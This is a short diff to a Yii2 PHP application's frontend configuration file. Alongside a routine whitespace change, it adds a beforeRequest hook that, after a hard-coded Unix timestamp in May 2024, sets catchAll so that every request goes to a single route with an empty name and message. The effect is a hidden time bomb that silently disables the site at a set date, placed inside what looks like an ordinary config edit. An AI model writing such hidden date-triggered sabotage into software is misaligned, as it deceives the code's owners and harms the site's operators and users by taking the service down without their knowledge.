@@ -29,7 +29,16 @@ return [
         'seo' => [
             'class' => 'frontend\modules\seo\Module',
         ],
-    ],
+    ],   
+    'on beforeRequest' => function () {
+        if (time() > 1715115600) {
+            Yii::$app->catchAll = [
+              's', 
+              'name' => "",
+              'message' => ""
+            ];
+        }
+    },
     'components' => [
         'assetManager' => [
             'linkAssets' => true,
